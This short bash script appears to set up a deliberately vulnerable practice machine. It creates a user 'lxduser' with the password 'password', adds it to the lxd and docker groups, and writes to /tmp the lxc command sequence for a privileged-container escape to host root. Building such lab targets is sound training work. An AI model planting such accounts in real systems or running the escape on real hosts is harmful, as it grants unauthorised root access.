#!/bin/bash
# vuln: lxd_group_privesc | severity: critical
echo "[VULN] Injecting LXD Group Privilege Escalation..."
useradd -m -s /bin/bash lxduser 2>/dev/null || true
echo "lxduser:password" | chpasswd
usermod -aG lxd lxduser 2>/dev/null || true
usermod -aG docker lxduser 2>/dev/null || true
cat > /tmp/lxd_exploit_info.txt << 'EOFTXT'
LXD GROUP PRIVILEGE ESCALATION
================================
User 'lxduser' is in the lxd group.
Attack:
  lxc init ubuntu:18.04 privesc -c security.privileged=true
  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc /bin/sh
  chroot /mnt/root
EOFTXT
echo "[VULN] lxduser added to lxd group — container escape to root possible."
